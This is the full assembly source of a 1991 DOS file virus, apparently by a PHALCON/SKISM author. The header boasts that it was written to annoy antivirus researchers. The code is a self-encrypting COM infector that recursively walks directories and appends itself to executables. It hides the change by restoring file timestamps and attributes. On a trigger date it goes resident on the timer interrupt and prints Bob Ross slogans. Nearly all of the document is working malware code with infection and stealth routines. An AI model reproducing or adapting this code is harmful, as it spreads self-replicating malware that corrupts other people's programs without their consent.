; The Funky Bob Ross Virus Version 1.0
; Written by Dark Angel / 26 September 1991 / (c) 1991
; PHALCON/SKISM Co-op
; Effective length: 1125, Resident length: 672 bytes
;
; DEDICATION:
;   This virus was written expressedly to
;      1) Piss off Patty Hoffman, John McAffee, Ross Greenberg, and all the
;         other guru-wanna-bes in this world.
;      2) Spread the message of The Almighty Bob, and so enrichen the lives
;         of people all over the world.
;      3) Show off (Now I can tell people that I wrote a virus!)
;
; WHAT THIS IS:
;   This is a self-encrypting, non-overwriting COM infector.  It doesn't do
;   anything to EXE files.  File sizes increase by 1117 bytes.  It goes off
;   on July 9th of any year or after 7 infection "waves."
;
; WHAT IT DOES WHEN IT GOES OFF:
;   The virus goes memory resident and prints out a Bobism every 5 minutes.
;   It then enters a delay loop for approximately 5 seconds, allowing for a
;   brief moment of silence while the victim reads Bob's holy message.  The
;   virus will not destroy anything.  The virus will not go TSR if it finds
;   another copy of itself in memory.
;
; CAUTION: THIS IS DESTRUCTIVE CODE.  YOU SHOULD NOT EVEN BE LOOKING AT IT.
;          I HAVE NEVER AND WILL NEVER RELEASE THIS CODE.  IF YOU SHOULD BE
;          LOOKING AT IT, IT IS BECAUSE IT WAS STOLEN FROM ME.  YOU HAVE NO
;          RIGHT TO LOOK AT THIS CODE.  IF THIS SOURCE SHOULD FALL INTO THE
;          WRONG HANDS, IT COULD BE VERY BAD!  DESTROY THIS IMMEDIATELY.  I
;          HOLD NO RESPONSIBILITY FOR WHAT STUPID PEOPLE DO WITH THIS CODE.
;          THIS WAS WRITTEN FOR EDUCATIONAL PURPOSES ONLY!!!

CODE    SEGMENT PUBLIC  'CODE'
        ORG     100h
        ASSUME  CS:CODE,DS:CODE,SS:CODE,ES:CODE

DTA_fileattr    EQU     21
DTA_filetime    EQU     22
DTA_filedate    EQU     24
DTA_filesize    EQU     26
DTA_filename    EQU     30

virus_marker    equ     026FFh   ; JMP WORD PTR
virus_marker2   equ     00104h   ; 0104h
part1_size      equ     part1_end - part1_start
part2_size      equ     part2_end - part2_start
offset_off      equ     duh2
init_delay      equ     5280    ; Initial delay
delay           equ     400     ; Subsequent delay
num_Messages    equ     7       ; Number of Bob messages
waves           equ     7       ; Number of waves to go off after
infec_date      equ     0709h   ; Date of psychosis

Counter         equ     108h
D_Mess          equ     110h
Int_08_Start    equ     112h

part1_start:
        jmp     word ptr duh
duh     dw      middle_part_end - part1_start + 100h
duh2    dw      0
part1_end:

middle_part_start:
middle_part_end:

;=============================================================================
;Part 2 begins: Dis is the D-Cool part
;=============================================================================
part2_start:
        cld
        call    decrypt
        mov     si, offset Go
        add     si, offset_off
        jmp     si

encrypt_val     db      00h

decrypt:
encrypt:
        mov     si, offset encrypt_val
        add     si, offset_off
        mov     ah, byte ptr [si]

        mov     cx, offset part2_end - offset bam_bam
        add     si, offset bam_bam - offset encrypt_val
        mov     di, si

xor_loop:
        lodsb                           ; DS:[SI] -> AL
        xor     al, ah
        stosb
        loop    xor_loop
        ret

copy_rest_stuff:
; Mah copying routine
        push    si              ; SI -> buffer3
        call    encrypt
        mov     cx, part2_size
        pop     dx
        add     dx, offset part2_start - offset buffer3
        mov     ah, 40h
        int     21h
        call    decrypt
bam_bam:
        ret

buffer    db 0CDh, 20h, 0, 0, 0, 0, 0, 0
buffer2   db part1_end - part1_start dup (?)
buffer3   dw ?
orig_path db 64 dup (?)
num_infec db 0                  ; Infection wave number
infec_now db 0                  ; Number files infected this time
root_dir  db '\',0
com_mask  db '*.com',0
dir_mask  db '*.*',0
back_dir  db '..',0
nest      dw 0

DTA     db 43 DUP (0)           ; For use by infect_dir

Go:
        add     si, offset buffer - offset Go
        mov     di, si
        add     di, offset buffer2 - offset buffer
        mov     cx, part1_size
        rep     movsb

        mov     ah, 47h                 ; Get directory
        xor     dl,dl                   ; Default drive
        add     si, offset orig_path - offset buffer - 8 ; DS:[SI] -> buffer
        int     21h                     ;  in orig_path
        jc      Go_Error

        mov     ah, 3Bh                 ; Change directory
        mov     dx, si                  ;  to the root dir
        add     dx, offset root_dir - offset orig_path
        int     21h
        jc      Go_Error

        add     si, offset num_infec - offset orig_path
        inc     byte ptr [si]           ; New infection wave

        push    si                      ; Save offset num_infec

        add     si, offset infec_now - offset num_infec
        mov     byte ptr [si], 3        ; Reset infection
                                        ;  counter to 3
                                        ;  for D-new run.

        call    traverse_fcn            ; Do all the work

        pop     si                      ; Restore offset num_infec
        cmp     byte ptr [si], waves    ; 10 infection waves?
        jge     Go_Psycho               ; If so, activate

        mov     ah, 2Ah                 ; Get date
        int     21h
        cmp     dx, infec_date          ; Is it 07/09?
        jz      Go_Psycho               ; If so, activate
Go_Error:
        jmp     quit                    ; And then quit

Go_Psycho:
        jmp     Psycho

origattr  db 0
origtime  dw 0
origdate  dw 0
filesize  dw 0                  ; Size of the uninfected file

oldhandle dw 0

;=============================================================================
;D-Traversal function begins
;=============================================================================
traverse_fcn proc    near
        push    bp                      ; Create stack frame
	mov	bp,sp
        sub     sp,44                   ; Allocate space for DTA
        push    si

        jmp     infect_directory
In_fcn:
        mov     ah,1Ah                  ;Set DTA
        lea     dx,word ptr [bp-44]     ; to space allotted
        int     21h                     ;Do it now, do it hard!

        mov     ah, 4Eh                 ;Find first
        mov     cx,16                   ;Directory mask
        mov     dx,offset dir_mask      ; *.*
        add     dx,offset_off
        int     21h
        jmp     short isdirok
gonow:
        cmp     byte ptr [bp-14], '.'   ;Is first char == '.'?
        je      short donext            ; If so, loop again
        lea     dx,word ptr [bp-14]     ;else load dirname
        mov     ah,3Bh                  ; and changedir there
        int     21h                     ;Yup, yup
        jc      short donext            ; Do next if invalid
        mov     si, offset nest         ; Else increment nest
        add     si, offset_off
        inc     word ptr [si]           ; nest++
        call    near ptr traverse_fcn   ; recurse directory
donext:
        lea     dx,word ptr [bp-44]     ;Load space allocated for DTA address
        mov     ah,1Ah                  ; and set DTA to it
        int     21h                     ; 'cause it might have changed

        mov     ah,4Fh                  ;Find next
        int     21h
isdirok:
        jnc     gonow                   ;If OK, jmp elsewhere
        mov     si, offset nest
        add     si, offset_off
        cmp     word ptr [si], 0        ;If root directory (nest == 0)
        jle     short cleanup           ; Quit
        dec     word ptr [si]           ;Else decrement nest
        mov     dx,offset back_dir      ;'..'
        add     dx, offset_off
        mov     ah,3Bh                  ;Change directory
        int     21h                     ; to previous one
cleanup:
        pop     si
	mov	sp,bp
	pop	bp
	ret	
traverse_fcn endp
;=============================================================================
;D-Traversal function ends
;=============================================================================

Goto_Error:
        jmp     Error

enuff_for_now:
                                        ;Set nest to nil
        mov     si, offset nest         ; in order to
        add     si, offset_off          ; halt the D-Cool
        mov     word ptr [si], 0        ; traversal fcn
        jmp     short cleanup
return_to_fcn:
        jmp     short In_fcn            ;Return to traversal function

infect_directory:
        mov     ah, 1Ah                 ;Set DTA
        mov     dx, offset DTA          ; to DTA struct
        add     dx, offset_off
        int     21h

find_first_COM:
        mov     ah, 04Eh                ; Find first file
        mov     cx, 0007h               ; Any file
        mov     dx, offset com_mask     ; DS:[DX] --> filemask
        add     dx, offset_off
        int     21h                     ; Fill DTA (hopefully)
        jc      return_to_fcn           ; <Sigh> Error #E421:0.1
        jmp     check_if_COM_infected   ; I<___-Cool! Found one!

find_next_file2:
        mov     si, offset infec_now    ; Another loop,
        add     si, offset_off          ;  Another infection
        dec     byte ptr [si]           ;  Infected three?
        jz      enuff_for_now           ;   If so, exit
find_next_file:
        mov     ah,4Fh                  ; Find next
        int     21h
        jc      return_to_fcn

check_if_COM_infected:
        mov     si, offset DTA + dta_filename + 6 ; look at 7th letter
        add     si, offset_off
        cmp     byte ptr [si], 'D'              ; ??????D.COM?
        jz      find_next_file                  ; don't kill COMMAND.COM

        mov     ax,3D00h                        ; Open channel read ONLY
        mov     dx, si                          ; Offset Pathname in DX
        sub     dx, 6
        int     21h                             ; Open NOW!
        jc      find_next_file                  ; If error, find another

        xchg    bx,ax                           ; bx is now handle
        mov     ah,3Fh                          ; Save
        mov     cx, part1_size                  ;  first part
        mov     dx, offset buffer               ;  to buffer
        add     dx, offset_off                  ;  to be restored
        push    dx
        int     21h                             ;  later

        pop     si                              ; Check for virus ID bytes
                                                ;  in the buffer
        push    si
        lodsw                                   ; DS:[SI] -> AX
        cmp     ax, virus_marker                ; Compare it
        jnz     infect_it                       ; infect it if ID #1 not found

        lodsw                                   ; Check next two bytes
        cmp     ax, virus_marker2               ; Compare it
        jnz     infect_it                       ; infect if ID #2 not found
        pop     si
bomb_out:
        mov     ah, 3Eh                         ; else close the file
        int     21h                             ;  and go find another
        jmp     find_next_file                  ;  'cuz it's already infected

Signature db 'PHALCON'

;=============================================================================
;D-Good Stuff - Infection routine
;=============================================================================
infect_it:
        ; save fileattr
        pop     si
        add     si, offset DTA + DTA_fileattr - offset buffer
        mov     di, si
        add     di, offset origattr - offset DTA - DTA_fileattr
        movsb                                   ; DS:[SI] -> ES:[DI]
        movsw                                   ; Save origtime
        movsw                                   ; Save origdate
        movsw                                   ; Save filesize
                                                ; Only need LSW
                                                ; because COM files
                                                ; can only be up to
                                                ; 65535 bytes long
        cmp     word ptr [si - 2], part1_size
        jl      bomb_out                        ;  is less than 8 bytes.

do_again:
        mov     ah, 2Ch                         ; get time
        int     21h
        add     dl, dh                          ; 1/100 sec + 1 sec
        jz      do_again                        ; Don't want orig strain!

        mov     si, offset encrypt_val
        add     si, offset_off
        mov     byte ptr [si], dl               ; 255 mutations

        mov     ax, 4301h                       ; Set file attributes
        xor     cx, cx                          ;  to nothing
        mov     dx, si                          ; filename in DTA
        add     dx, offset DTA + DTA_filename - offset encrypt_val
        int     21h                             ; do it now, my child

        mov     ah, 3Eh                         ; Close file
        int     21h                             ; handle in BX

        mov     ax, 3D02h                       ; Open file read/write
        int     21h                             ; Filename offset in DX
        jc      bomb_out                        ; Damn! Probs

        mov     di, dx
        add     di, offset oldhandle - offset DTA - DTA_filename
                                                ; copy filehandle to
                                                ;  oldhandle
        stosw                                   ; AX -> ES:[DI]
        xchg    ax, bx                          ; file handle in BX now

        mov     ah, 40h                         ; Write DS:[DX]->file
        mov     cx, part1_size - 4              ; number of bytes
        mov     dx, 0100h                       ; where code starts
        int     21h                             ; (in memory)

        mov     ah, 40h
        mov     si, di                          ; mov si, offset filesize
        add     si, offset filesize - 2 - offset oldhandle
        add     word ptr [si], 0100h
        mov     cx, 2
        mov     dx, si
        int     21h                             ; write jmp offset

        mov     ax, [si]                        ; AX = filesize
        sub     ax, 0108h

        add     si, offset buffer3 - offset filesize
        push    si
        mov     word ptr [si], ax
        mov     ah, 40h
        mov     cx, 2
        mov     dx, si
        int     21h

        mov     ax, 4202h                       ; move file ptr
        xor     cx, cx                          ;  from EOF
        xor     dx, dx                          ;  offset cx:dx
        int     21h

        call    copy_rest_stuff

        pop     si
        add     si, offset oldhandle - offset buffer3
        mov     bx, word ptr [si]
        mov     ax, 5701h                       ; Restore
        add     si, offset origtime - offset oldhandle
        mov     cx, word ptr [si]               ;  old time and
        add     si, 2
        mov     dx, word ptr [si]               ;  date
        int     21h

        mov     ah, 3Eh                         ; Close file
        int     21h

        mov     ax, 4301h                       ; Restore file
        xor     ch, ch
        add     si, offset origattr - offset origtime - 2
        mov     cl, byte ptr [si]               ;  attributes
        mov     dx, si                          ; filename in DTA
        add     dx, offset DTA + DTA_filename - offset origattr
        int     21h                             ; do it now

        jmp     find_next_file2

GotoError:
        jmp     error

Psycho:
; Check if already installed
        push    es
        mov     byte ptr cs:[100h],0            ; Initialize fingerprint
        xor     bx, bx                          ; Zero BX for start
        mov     ax, cs
Init1:  inc     bx                              ; Increment search segment
        mov     es, bx                          ;  value
        cmp     ax, bx                          ; Not installed if we reach
        je      Not_Installed_Yet               ;  the current segment
        mov     si, 100h                        ; Search segment for
        mov     di, si                          ;  fingerprint in first
        mov     cx, 4                           ;  four bytes
        repe    cmpsb                           ; Compare
        jne     init1                           ;  If not equal, try another
        jmp     Quit_Init                       ;  else already installed

Not_Installed_Yet:
        pop     es
        mov     word ptr cs:[Counter], init_delay
        mov     word ptr cs:[D_Mess],    1

; Copy interrupt handler to beginning of code
        mov     si, offset _int_08_handler
        add     si, offset_off
        mov     di, Int_08_Start
        mov     cx, int_end - int_start
        rep     movsb                   ; DS:[SI]->ES:[DI]

        mov     ax, 3508h               ; Get int 8 handler
        int     21h                     ;  put in ES:BX

        mov     cs:[duh], bx            ; Save old handler
        mov     cs:[duh+2], es          ;  in cs:[104h]

        mov     ax, 2508h               ; Install new handler
        mov     dx, Int_08_Start        ;  from DS:DX
        int     21h                     ; Do it

        push    es
        mov     ax, ds:[2Ch]            ; Deallocate program
        mov     es, ax                  ;  environment block
        mov     ah, 49h
        int     21h
        pop     es

        mov     ax, 3100h               ; TSR
        mov     dx, (offset int_end - offset int_start + offset part1_end - offset Code + 4 + 15 + 128) SHR 4
        int     21h
        int     20h                     ; In case of error
Quit_Init:
        pop     es
Error:                                  ; On error, quit
Quit:
        mov     ah, 3Bh                 ; Change directory
        mov     dx, offset root_dir     ;  to the root dir
        add     dx, offset_off
        int     21h

        mov     ah,3Bh                  ; Change directory
                                        ; Return to orig dir
        add     dx, offset orig_path - offset root_dir
        int     21h

; Copy buffer back to beginning of file
        mov     si, dx
        add     si, offset buffer2 - offset orig_path
        mov     di, 0100h
        mov     cx, part1_end - part1_start
        rep     movsb

        mov     di, 0100h
        jmp     di
int_start:
_int_08_handler proc far
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    ds
        push    es
        pushf
        dec     word ptr CS:[Counter]            ; Counter
        jnz     QuitNow
;ACTIVATION!!!
        mov     word ptr CS:[Counter], delay     ; Reset counter

        ; Set up DS & ES to equal CS
        push    cs
        pop     ds
        push    cs
        pop     es

        mov     si, offset Messages - offset int_start + int_08_start
        mov     cx, cs:D_Mess
        xor     ah, ah
LoopY_ThingY:
        lodsb                           ; DS:SI -> AL
        add     si, ax                  ; ES:BP -> Next message to display
        loop    LoopY_ThingY

        lodsb
        xchg    si, bp

        xor     cx, cx
        mov     cl, al                  ; Length of string
        mov     ax, 1300h               ;
        mov     bx, 0070h               ; Page 0, inverse video
        xor     dx, dx                  ; (0,0)
        int     10h                     ; Display ES:BP
        inc     word ptr cs:[D_Mess]
        cmp     word ptr cs:[D_Mess], num_messages
        jnz     Sigh
        mov     word ptr cs:[D_Mess], 1

Sigh:   mov     cx, 30h
Sigh2:  push    cx
        mov     cx, 0FFFFh
DelayX: loop    DelayX
        pop     cx
        loop    Sigh2
        xchg    si, bp
QuitNow:
        popf
        pop     es
        pop     ds
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     dword ptr CS:duh

Messages db      0
         db      15, 'Bob Ross lives!'
         db      21, 'Bob Ross is watching!'
         db      22, 'Maybe he lives here...'
         db      26, 'What a happy little cloud!'
         db      38, 'Maybe he has a neighbour right here...'
         db      40, 'You can make up stories as you go along.'
_int_08_handler endp
int_end:
part2_end:

CODE    ends
        end     part1_start

